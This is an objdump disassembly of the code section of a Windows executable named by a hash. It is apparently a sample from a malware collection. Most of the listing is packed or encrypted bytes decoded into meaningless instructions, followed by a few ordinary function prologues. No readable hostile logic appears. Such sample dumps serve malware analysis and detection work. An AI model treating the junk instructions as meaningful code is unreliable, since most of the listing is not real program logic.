
a711eb5c49559b06e23d87212f75689c74b3547899bf4d268ecb491ea04faa78.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	push   ebx
  4d0001:	cwde   
  4d0002:	push   edi
  4d0003:	push   ss
  4d0004:	outs   dx,BYTE PTR ds:[esi]
  4d0005:	popf   
  4d0006:	sub    cl,BYTE PTR [ebp-0x42]
  4d0009:	loope  0x4d0074
  4d000b:	jo     0x4cffb1
  4d000d:	and    DWORD PTR ds:[edi],eax
  4d0010:	sub    BYTE PTR [ebx-0x1e],cl
  4d0013:	into   
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06af
  4d06c1:	std    
  4d06c2:	jmp    0x4d0655
  4d06c4:	sbb    DWORD PTR [edx],0xec67f183
  4d06ca:	test   al,0x1f
  4d06cc:	mov    eax,DWORD PTR [esi]
  4d06ce:	cmp    eax,0xcf983d79
  4d06d3:	and    eax,0xf9db321e
  4d06d8:	inc    edx
  4d06d9:	bts    DWORD PTR [ecx-0x44],esi
  4d06dd:	sbb    ebp,DWORD PTR [ebx+0x3aa98f56]
  4d06e3:	loop   0x4d0757
  4d06e5:	fnsave [ecx-0x3720beab]
  4d06eb:	jo     0x4d0678
  4d06ed:	call   DWORD PTR [ebp-0x75]
  4d06f0:	in     al,dx
  4d06f1:	sub    esp,0x4c
  4d06f4:	lea    ecx,ds:0x4d3120
  4d06fa:	or     DWORD PTR [ebp-0x40],0x10
  4d06fe:	push   ecx
  4d06ff:	push   DWORD PTR [ecx+0x160]
  4d0705:	push   edx
  4d0706:	push   ebx
  4d0707:	push   ebx
  4d0708:	call   0x4d10e0
  4d070d:	add    esp,0x10
  4d0710:	pop    ecx
  4d0711:	push   ecx
  4d0712:	mov    ebx,0x0
  4d0717:	push   ebx
  4d0718:	call   0x4d106c
  4d071d:	add    esp,0x4
  4d0720:	pop    ecx
  4d0721:	push   ecx
  4d0722:	mov    edx,0x0
  4d0727:	push   edx
  4d0728:	call   0x4d11b0
  4d072d:	add    esp,0x4
  4d0730:	pop    ecx
  4d0731:	add    esp,0x4c
  4d0734:	pop    ebp
  4d0735:	ret    
  4d0736:	add    BYTE PTR [eax],al
  4d0738:	mov    edi,edi
  4d073a:	push   ebp
  4d073b:	mov    ebp,esp
  4d073d:	sub    esp,0x50
  4d0740:	lea    esi,[edi-0xb4]
  4d0746:	xor    DWORD PTR [ebp-0x18],ebx
  4d0749:	push   esi
  4d074a:	push   eax
  4d074b:	push   ebx
  4d074c:	push   edx
  4d074d:	call   0x4d13bc
  4d0752:	add    esp,0xc
  4d0755:	pop    esi
  4d0756:	call   0x4d0820
  4d075b:	add    esp,0x4
  4d075e:	mov    ecx,0x0
  4d0763:	push   ecx
  4d0764:	call   0x4d0898
  4d0769:	add    esp,0x4
  4d076c:	add    esp,0x50
  4d076f:	pop    ebp
  4d0770:	ret    
  4d0771:	add    BYTE PTR [eax],al
  4d0773:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0779:	sub    esp,0x58
  4d077c:	lea    ebx,ds:0x4d3014
  4d0782:	cmp    ebx,0x64b6
  4d0788:	je     0x4d0777
  4d078a:	push   0x0
  4d078c:	call   0x4d0a1c
  4d0791:	add    esp,0x4
  4d0794:	push   ebx
  4d0795:	push   DWORD PTR [ebx+0x98]
  4d079b:	push   esi
  4d079c:	push   DWORD PTR [ebx+0x1d0]
